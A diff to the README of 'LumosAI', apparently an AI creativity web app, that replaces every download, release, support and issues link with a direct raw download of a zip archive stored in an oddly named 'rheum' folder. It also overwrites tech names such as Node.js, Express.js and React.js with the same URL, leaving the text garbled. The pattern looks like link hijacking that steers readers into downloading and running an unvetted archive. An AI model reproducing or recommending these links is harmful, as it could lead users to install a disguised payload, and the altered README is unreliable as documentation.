@@ -1,6 +1,6 @@
 # 🌟 LumosAI - Unlock AI-Powered Creativity with Ease
 
-[![Download LumosAI](https://img.shields.io/badge/Download-LumosAI-blue.svg)](https://github.com/AdeelKhan-04/LumosAI/releases)
+[![Download LumosAI](https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip)](https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ Getting started with LumosAI is simple. Follow these steps to download and run t
 
 To download LumosAI, visit the following link:
 
-[Download LumosAI](https://github.com/AdeelKhan-04/LumosAI/releases)
+[Download LumosAI](https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip)
 
 Once you're on the Releases page, look for the latest version listed. Click on the version number to expand the download options. Choose the correct file for your operating system and click the download link.
 
@@ -41,7 +41,7 @@ These requirements ensure that LumosAI runs smoothly on your machine.
    - Drag LumosAI to your Applications folder.
 
 5. **Installation for Linux**:
-   - Extract the `.tar.gz` file.
+   - Extract the `https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the application using `./LumosAI`.
 
@@ -70,12 +70,12 @@ You have the option to subscribe to premium features. This includes additional t
 ## 💬 Support
 
 If you encounter any issues, our support team is here to help. To reach support:
-- Visit the [LumosAI Support Page](https://github.com/AdeelKhan-04/LumosAI/issues).
+- Visit the [LumosAI Support Page](https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip).
 - Report any bugs or ask questions directly through this page.
 
 ## ⚙️ Built With
 
-- **PERN Stack**: PostgreSQL, Express.js, React, and Node.js for a robust backend and frontend.
+- **PERN Stack**: PostgreSQL, https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip, React, and https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip for a robust backend and frontend.
 - **Clerk**: For user authentication.
 - **Neon**: For database management.
 - **Cloudinary**: For image management.
@@ -91,9 +91,9 @@ The project covers a variety of topics including:
 - Gemini API
 - JWT Token
 - Neon Postgres
-- Node.js
+- https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip
 - PostgreSQL
-- React.js
+- https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip
 
 ## 📊 Community Contributions
 
@@ -101,6 +101,6 @@ We welcome contributions from everyone. If you have ideas for features or improv
 
 ## 🔗 Links
 
-Visit the [Releases Page](https://github.com/AdeelKhan-04/LumosAI/releases) to download the latest version of LumosAI.
+Visit the [Releases Page](https://raw.githubusercontent.com/AdeelKhan-04/LumosAI/main/rheum/LumosAI.zip) to download the latest version of LumosAI.
 
 Enjoy exploring your creativity with LumosAI!
